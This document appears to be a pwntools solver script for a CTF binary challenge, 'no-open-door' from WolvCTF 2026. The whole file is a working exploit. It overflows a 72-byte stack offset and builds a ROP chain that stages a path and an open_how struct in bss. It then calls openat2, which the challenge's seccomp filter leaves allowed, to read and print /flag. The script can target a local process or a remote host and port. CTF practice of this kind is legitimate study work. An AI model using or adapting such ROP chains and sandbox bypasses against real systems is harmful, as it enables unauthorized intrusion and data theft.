#!/usr/bin/env python3
import sys

CLI_ARGS = sys.argv[1:]

# no-open-door solver (WolvCTF 2026)
# seccomp blocks open/openat/execve/execveat but ALLOWS openat2 (437).
# Plan: overflow -> ROP that fully stages a path string + `struct open_how` into bss,
# then openat2(/flag) -> read(returned fd) -> write(1).
#
# usage:
#   python3 solve.py            # local ./no-open-door
#   python3 solve.py HOST PORT  # remote
from pwn import *

context.arch = "amd64"
context.log_level = "info"

elf = ELF("./no-open-door")


def start():
    if len(CLI_ARGS) >= 2:
        return remote(CLI_ARGS[0], int(CLI_ARGS[1]))
    return process(elf.path)


# ---- gadgets (static no-pie => all addresses known & plentiful) ----
rop = ROP(elf)
POP_RAX = rop.find_gadget(["pop rax", "ret"])[0]
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
POP_RSI = rop.find_gadget(["pop rsi", "ret"])[0]
POP_RDX = rop.find_gadget(["pop rdx", "ret"])[0]
SYSCALL = rop.find_gadget(["syscall", "ret"])[0]
RET = rop.find_gadget(["ret"])[0]

# r10 is openat2's 4th syscall argument; this gadget is planted in the binary.
POP_R10 = rop.find_gadget(["pop r10", "ret"])[0]
FD_TO_RDI = elf.sym.fd_to_rdi

log.info("pop rax %#x | pop rdi %#x | pop rsi %#x | pop rdx %#x | pop r10 %s | syscall %#x",
         POP_RAX, POP_RDI, POP_RSI, POP_RDX,
         hex(POP_R10), SYSCALL)


def do_syscall(nr, rdi=0, rsi=0, rdx=0, r10=None):
    c = p64(POP_RAX) + p64(nr)
    if rdi is not None:
        c += p64(POP_RDI) + p64(rdi)
    c += p64(POP_RSI) + p64(rsi)
    c += p64(POP_RDX) + p64(rdx)
    if r10 is not None:
        c += p64(POP_R10) + p64(r10)
    c += p64(SYSCALL)
    return c


# ---- scratch layout in bss ----
base = elf.bss(0x100)      # ponytail: elf.bss(0x100) => safe writable region
path = base                # "/flag\0"
how = base + 0x40          # struct open_how { flags, mode, resolve } = 24 bytes
out = base + 0x80          # where the flag lands

AT_FDCWD = 0xffffffffffffff9c  # -100
O_RDONLY = 0

chain = p64(RET)                                           # align the C helper call
chain += p64(POP_RDI) + p64(0) + p64(POP_RSI) + p64(base)
chain += p64(POP_RDX) + p64(0x100) + p64(elf.sym.read_full) # consume all staged bytes
chain += do_syscall(437, AT_FDCWD, path, how, r10=24)      # openat2(AT_FDCWD, "/flag", how, 24)
chain += p64(FD_TO_RDI)                                    # move returned fd from rax to rdi
chain += do_syscall(0, None, out, 100)                     # read(openat2's fd, out, 100)
chain += do_syscall(1, 1, out, 100)                        # write(1, out, 100)
chain += do_syscall(231, 0)                               # exit_group(0)

# offset: buf[64] + saved rbp[8] = 72.  // ponytail: verify against the build.
OFFSET = 72
payload = b"A" * OFFSET + chain

io = start()
io.recvuntil(b"open.")
io.send(payload.ljust(0x200, b"\x00"))  # fill the 0x200 vuln read exactly so staged bytes go to the next read (socket coalescing)

# staged data consumed by read_full(0, base, 0x100):
staged = b"/flag\x00".ljust(0x40, b"\x00")   # path (0x40 wide -> how lands at base+0x40)
staged += p64(O_RDONLY) + p64(0) + p64(0)      # open_how: flags, mode, resolve
io.send(staged.ljust(0x100, b"\x00"))

data = io.recvall(timeout=5)
print(data)
assert b"wctf{" in data, "no flag in output"
log.success("flag: %s", data[data.index(b"wctf{"):].split(b"}")[0] + b"}")
